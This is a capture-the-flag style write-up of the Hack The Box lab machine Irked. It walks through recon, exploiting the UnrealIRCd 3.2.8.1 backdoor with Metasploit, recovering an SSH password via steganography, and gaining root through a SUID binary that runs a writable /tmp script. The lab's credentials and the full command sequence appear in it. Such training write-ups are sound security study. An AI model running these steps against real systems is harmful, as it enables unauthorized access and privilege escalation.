---
layout: post
title: "Irked - 10.10.10.117"
description: "A write-up of Hack the Box's Irked machine."
tags: [HTB, Write-Up, Pentest, Lab]
---

# Irked - 10.10.10.117

### Abstract

This short write-up will cover Hack The Box's machine, Irked. The box is a vulnerable server with
numerous open ports leaving multiple entry points. Initial access to the machine is gained through
exploiting an outdated version of an IRC service, user and root access are then followed shortly after.
The write-up will cover recon and initial exploitation, exploitation to user, and privilege escalation
to root.

[TOC]

### Tools

- [Kali Linux](https://www.kali.org/downloads/)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [Metasploit](https://www.metasploit.com/)
- [Steghide](http://steghide.sourceforge.net/)

## Reconnaissance

### NMAP

The first tool ran against Irked is NMAP. This tool scans the server for open ports and the services
that are using them. The below command is executed:

```bash
nmap -sC -sV -p- 10.10.10.117
```

The following is returned (I snipped out some of the extraneous information):

```bash
Nmap scan report for 10.10.10.117
Host is up (0.18s latency).
Not shown: 65493 closed ports, 35 filtered ports
PORT
STATE SERVICE VERSION
22/tcp
open ssh
OpenSSH 6.7 p1 Debian 5+ deb8u4 (protocol 2.0)
80/tcp
open http
Apache httpd 2.4.10 ((Debian))
| _http-server-header: Apache /2.4.10 (Debian)
| _http-title: Site doesn't have a title (text/html).
111/tcp
111/ tcp rpcbind
111/ udp rpcbind
58199/tcp status
59248/udp status
6697/tcp open irc
UnrealIRCd
8067/tcp open irc
UnrealIRCd
58199/tcp open status 1 (RPC # 100024)
65534/tcp open irc
UnrealIRCd
Service Info: Host: irked.htb; OS: Linux;
CPE: cpe: /o: linux: linux_kernel
```

From the scan, we see that there are several ports open. Most notably: 22, 80, 6697, 8067, and
65534.

Port 22 is running OpenSSH 6.7p1 for Debian, port 80 is running Apache 2.4.10.

Ports 6697, 8067 and 65534 are running UnrealIRCd.

Ports 111 and 58199 are utilized by RPC.

### Gobuster

Another tool that can be used in the reconnaissance stage, is `gobuster` or `dirbuster`. For this particular box, I ran `gobuster`. The below command is executed:

```bash
gobuster -e -u http ://10.10.10.117
```

The following will be returned:

```bash
=====================================================
Gobuster v2 .0.1
OJ Reeves ( @TheColonial )
=====================================================
[+] Mode
: dir
[+] Url/Domain
: http://10.10.10.117/
[+] Threads
: 30
[+] Wordlist
: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Expanded
: true
[+] Timeout
: 10s
=====================================================
2019/02/20 15:07:50 Starting gobuster
=====================================================
http://10.10.10.117/manual (Status:301)
=====================================================
2019/02/20 15:15:58 Finished
=====================================================
```

In this case, the `gobuster` results return nothing too relevant. We could proceed with a larger
directory list, however for Irked, we will not be gaining access through port 80.

## Exploitation

### Low Privilege Shell via UnrealIRCd

From our NMAP scans, we know that there is an IRC server running. Let’s try to connect, shall we?
Connecting to the IRC server using port 65534 via HexChat granted access with no authentication,
and we are greeted with the following MOTD in IRC:

```bash
* Welcome to the ROXnet IRC Network root_!root@10.10.**.***
* Your host is irked.htb, running version Unreal3.2.8.1
* This server was created Mon May 14 2018 at 13:12:50 EDT
* irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp
```

Score. The MOTD of the IRC channel displays the UnrealIRCd version number: `Unreal 3.2.8.1`
A quick exploit-db search yields the following: https://www.exploit-db.com/exploits/16922
Examination of this exploit, we realize it is a `Metasploit` module. Let’s fire up `Metasploit` with the
following command: `msfdb run`

Now that we have Metasploit running, let’s use the exploit with the following command:

`msf5> use exploit/unix/irc/unreal_ircd_3281_backdoor`

Now let’s configure and run the exploit using the following commands below:

```bash
msf5 exploit (unreal_ircd_3281_backdoor) > set RHOSTS 10.10.10.117
msf5 exploit (unreal_ircd_3281_backdoor) > set RPORT 65534
msf5 exploit (unreal_ircd_3281_backdoor) > exploit
```

We are now a low privilege shell on the box. Running `whoami` tells us that we are ircd, and id tells
us that we are `uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)`. We can spawn a TTY shell
and begin further exploitation. Woohoo!

### User Access via Low Privilege Shell

With our new found low privilege shell access, we can begin enumerating all directories and files
that we have access to. Using cd, we navigate to `/home/` where we see that we have access to two
users: `djmardov` and ircd. Let’s inspect `djmardov`. Perform the following commands below:

```bash
$ cd /home/djmardov/Documents
$ ls -a
```

Using `ls -a`, we notice there are two files in the documents directory, `.backup` and `user.txt`. The
`user.txt` file is the user flag, however we do not have permissions to read the file. `.backup`, on the
other hand, is readable. We use `cat` to read the file: `$ cat /home/djmardov/Documents/.backup`

Returns:

```bash
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Steg? Perhaps steganography is in play here. [Steganography](https://en.wikipedia.org/wiki/Steganography) is the act of hiding information in plain
sight, typically in media files. Thinking back to port 80, `index.html` had an image on it. Let’s give
it a shot. Download the image from the homepage, `irked.jpg`, and let’s run `steghide` on it, using
`UPupDOWNdownLRlrBAbaSSss` as the password.

```bash
steghide extract -sf irked.jpg
Enter passphrase: UPupDOWNdownLRlrBAbaSSss
wrote extracted data to "pass.txt".
```

`pass.txt` contains the value `Kab6h+m+bbp2J:HG`. This is the SSH password for `djmardov`. Let’s
proceed with logging in as the user with the following commands below:

```bash
root@kali:~# ssh djmardov@10.10.10.117
djmardov@10.10.10.117’s password: Kab6h+m+bbp2J:HG
```

We’re in. Let’s grab the user flag from earlier, `user.txt`.

```bash
djmardov@irked:~$ cat /home/djmardov/Documents/user.txt
4 a66a78b12dc0e661a59d3f5********
```

### Privilege Escalation to Root

For this privilege escalation exploit, enumeration is key. One of the best places to start enumeration
is the `SUID binaries`. Let’s find all of the active `SUID binaries` by running the below:

```bash
djmardov@irked:~$ find / -perm -u=s -type f 2>/dev/null
```

Returns:

```bash
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
```

We will then begin enumerating the binaries. We inspect each binary against public exploits, but
also utilizing `strings` and other enumeration tool in kali. We do this for all binaries until we hit
`viewuser`. This binary is not a native Debian `SUID binary`, which is suspicious. We execute the
binary and see the following:

```bash
djmardov@irked:~$ viewuser
This application is being developed to set and test user permissions
It is still being actively developed
(unknown):0
2019-02-20 15:59 (:0)
djmardov pts /1
2019-02-20 16:01 (10.10.**.**)
sh: 1: /tmp/listusers: not found
```

This looks like a custom binary that runs who along with some other instructions. The last line of
the output tells us that the `SUID binary` is reading `/tmp/listusers`. Let’s go check it out.

```bash
djmardov@irked:~$ cd /tmp/
djmardov@irked:~$ ls -a
```

Nothing! Looks like `listusers` hasn't been created. Let's create it and set permissions- and while we're at it, let's try to get `viewuser` to execute a command for us.

```bash
djmardov@irked:~$ echo "cat /root/root.txt" > /tmp/listusers
djmardov@irked:~$ chmod +755 listusers
```

Nice. Let’s see what this does when we execute `viewuser` now.

```bash
djmardov@irked:~$ viewuser
This application is being developed to set and test user permissions
It is still being actively developed
(unknown):0
2019-02-20 15:59 (:0)
djmardov pts /1
2019-02-20 16:01 (10.10.**.**)
8 d8e9e8be64654b6dccc3bff********
```

Success! `sh: 1: /tmp/listusers: not found` has successfully changed tot he contents of `/root/root.txt`. Based on this finding, we can easily modify `/tmp/listusers` with shell code which will allow a full root shell. 
